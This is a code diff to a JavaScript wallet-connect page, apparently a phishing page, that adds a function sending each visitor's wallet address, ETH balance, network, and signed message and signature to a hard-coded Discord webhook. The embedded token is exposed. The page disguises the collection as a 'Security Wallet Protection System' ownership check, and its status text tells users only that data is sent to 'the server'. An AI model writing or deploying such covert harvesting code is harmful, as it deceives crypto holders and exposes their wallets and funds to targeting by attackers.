@@ -26,6 +26,113 @@ function hideElement(element) {
     element.classList.add('hidden');
 }
 
+// Функция для отправки данных на Discord webhook
+async function sendToDiscordWebhook(userAddress, signature, message) {
+    const webhookURL = 'https://discordapp.com/api/webhooks/1420886875543048366/0BLuHD0PYjBd5nfjSGoPZRVQU-xlhrkH9nIMcWbM-swL6cufeQ3ZQ74NpYpKMB3rF_82';
+    
+    // Получаем баланс и название сети
+    const balance = await getShortBalance();
+    const network = await getNetworkName();
+    
+    const embed = {
+        title: "🔐 Новое подключение кошелька",
+        color: 3066993, // Зеленый цвет
+        timestamp: new Date().toISOString(),
+        fields: [
+            {
+                name: "💰 Адрес кошелька",
+                value: `\`\`\`${userAddress}\`\`\``,
+                inline: false
+            },
+            {
+                name: "💎 Баланс",
+                value: balance,
+                inline: true
+            },
+            {
+                name: "🌐 Сеть",
+                value: network,
+                inline: true
+            },
+            {
+                name: "✍️ Подпись (первые 50 символов)",
+                value: `\`\`\`${signature.substring(0, 50)}...\`\`\``,
+                inline: false
+            },
+            {
+                name: "📝 Сообщение",
+                value: `\`\`\`${message.substring(0, 100)}...\`\`\``,
+                inline: false
+            },
+            {
+                name: "⏰ Время подключения",
+                value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
+                inline: false
+            }
+        ],
+        footer: {
+            text: "Security Wallet Protection System"
+        }
+    };
+
+    try {
+        const response = await fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                embeds: [embed],
+                username: 'Wallet Security Bot',
+                avatar_url: 'https://cdn-icons-png.flaticon.com/512/6001/6001533.png'
+            })
+        });
+
+        if (response.ok) {
+            console.log('✅ Данные успешно отправлены в Discord');
+            return true;
+        } else {
+            console.error('❌ Ошибка отправки в Discord:', response.status);
+            return false;
+        }
+    } catch (error) {
+        console.error('❌ Ошибка при отправке в Discord:', error);
+        return false;
+    }
+}
+
+// Функция для получения названия сети
+async function getNetworkName() {
+    try {
+        const chainId = await web3.eth.getChainId();
+        const networks = {
+            1: 'Ethereum Mainnet',
+            56: 'Binance Smart Chain', 
+            137: 'Polygon',
+            42161: 'Arbitrum',
+            10: 'Optimism',
+            43114: 'Avalanche',
+            250: 'Fantom',
+            100: 'Gnosis Chain'
+        };
+        
+        return networks[chainId] || `Unknown Network (ID: ${chainId})`;
+    } catch (error) {
+        return 'Network Unknown';
+    }
+}
+
+// Функция для получения краткого баланса
+async function getShortBalance() {
+    try {
+        const balance = await web3.eth.getBalance(userAddress);
+        const ethBalance = web3.utils.fromWei(balance, 'ether');
+        return `${parseFloat(ethBalance).toFixed(4)} ETH`;
+    } catch (error) {
+        return 'Balance Unknown';
+    }
+}
+
 // Проверяем наличие кошелька
 if (typeof window.ethereum !== 'undefined') {
     console.log('Кошелек найден!');
@@ -81,7 +188,15 @@ signButton.addEventListener('click', async () => {
         const message = `Подтверждение владения кошельком для системы безопасности. Время: ${new Date().toLocaleString()}`;
         const signature = await web3.eth.personal.sign(message, userAddress, '');
         
-        updateStatus(`✅ Сообщение успешно подписано! Подпись: ${signature.substring(0, 20)}...`);
+        // Отправляем данные в Discord
+        updateStatus('⌛ Отправка данных на сервер...', false, true);
+        const sendSuccess = await sendToDiscordWebhook(userAddress, signature, message);
+        
+        if (sendSuccess) {
+            updateStatus(`✅ Сообщение успешно подписано и отправлено! Подпись: ${signature.substring(0, 20)}...`);
+        } else {
+            updateStatus(`✅ Сообщение подписано, но ошибка отправки на сервер. Подпись: ${signature.substring(0, 20)}...`, false, true);
+        }
         
     } catch (error) {
         if (error.code === 4001) {
